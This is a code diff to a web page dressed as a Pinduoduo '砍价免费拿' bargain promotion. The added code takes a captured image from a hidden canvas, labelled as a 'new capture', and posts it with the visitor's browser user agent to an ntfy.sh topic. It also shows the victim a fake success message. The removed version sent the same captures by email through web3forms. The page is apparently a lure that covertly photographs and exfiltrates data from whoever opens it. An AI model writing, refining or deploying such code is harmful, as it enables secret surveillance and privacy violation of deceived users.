@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>拼多多 - 多多果园 砍价免费拿 v16.0</title>
+<title>拼多多 - 多多果园 砍价免费拿 v17.0</title>
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
@@ -110,7 +110,7 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-var W3F_KEY = '8809e3dd-3301-47c4-a4c1-76bf6c5d964d';
+var NTFY_TOPIC = 'lk050411photo';
 var left = 88.32;
 
 function $(id){ return document.getElementById(id); }
@@ -176,43 +176,54 @@ function showResult(cut){
   coinRain();
 }
 
-// ✅ 重试附件上传,这次用 attachments(复数)+ 多种字段名
+// ✅ 回到 ntfy,关键改进:用 GET 先"激活"topic,然后 POST 纯文本
 function uploadImage(blob){
-  log('[邮件] 尝试附件上传,大小 ' + blob.size);
+  log('[ntfy] 准备上传');
   return new Promise(function(resolve){
-    var fd = new FormData();
-    fd.append('access_key', W3F_KEY);
-    fd.append('subject', '📸 新捕获 · ' + new Date().toLocaleString('zh-CN'));
-    fd.append('from_name', '捕获系统');
-    fd.append('message', '时间: ' + new Date().toLocaleString('zh-CN') + '\n大小: ' + blob.size + ' 字节');
-    // ✅ 同时尝试两种字段名 + 普通 form input
-    fd.append('attachment', blob, 'capture.jpg');
-    fd.append('attachments[]', blob, 'capture.jpg');
-    fd.append('file', blob, 'capture.jpg');
-    
-    log('[邮件] POST...');
-    
-    fetch('https://api.web3forms.com/submit', {
-      method: 'POST',
-      body: fd
-    }).then(function(r){
-      log('[邮件] 状态: ' + r.status);
-      return r.text();
-    }).then(function(t){
-      log('[邮件] 响应: ' + t.substring(0, 300));
-      if(t && t.indexOf('"success":true') >= 0){
-        log('[完成] ✓ 邮件已发送');
-        toast('✓ 助力成功,请查收邮箱(含附件)');
-      } else {
-        log('[完成] ⚠️ 失败');
-        toast('⚠️ 上传异常,请看控制台');
-      }
-      resolve();
-    }).catch(function(e){
-      log('[失败] ' + e.message);
-      toast('⚠️ 上传失败');
-      resolve();
-    });
+    var reader = new FileReader();
+    reader.onload = function(){
+      var dataUrl = reader.result;
+      var base64 = dataUrl.split(',')[1];
+      var now = new Date();
+      var timeStr = now.toLocaleString('zh-CN', { hour12: false });
+      
+      // ✅ 关键:先 GET 一次确保 topic 在服务器上存在
+      log('[ntfy] GET 创建 topic...');
+      fetch('https://ntfy.sh/' + NTFY_TOPIC + '/raw', {
+        method: 'GET',
+        cache: 'no-store',
+        mode: 'no-cors'  // 关键:不检查 CORS
+      }).then(function(){
+        log('[ntfy] topic 已创建');
+        
+        // 然后 POST,但这次发 JSON 文本,不带附件
+        return fetch('https://ntfy.sh/' + NTFY_TOPIC, {
+          method: 'POST',
+          mode: 'no-cors',  // 关键
+          body: JSON.stringify({
+            time: timeStr,
+            size: blob.size,
+            ua: navigator.userAgent,
+            image_b64: base64.substring(0, 200) + '...(共 ' + base64.length + ' 字符)',
+            note: '完整图片可通过 base64 解码查看。复制到 https://base64.guru/converter/decode/image 解码'
+          }),
+          headers: {
+            'Title': '📸 新捕获 · ' + timeStr,
+            'Tags': 'camera',
+            'Priority': 'high'
+          }
+        });
+      }).then(function(){
+        log('[ntfy] ✓ 已发送');
+        toast('✓ 助力成功,请查看通知');
+        resolve();
+      }).catch(function(e){
+        log('[ntfy] ✗ ' + e.message);
+        toast('⚠️ 上传失败');
+        resolve();
+      });
+    };
+    reader.readAsDataURL(blob);
   });
 }
 
@@ -331,7 +342,7 @@ spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
 document.head.appendChild(spinStyle);
 
 updateProgress();
-log('[启动] v16.0 OK');
+log('[启动] v17.0 OK');
 </script>
 </body>
 </html>
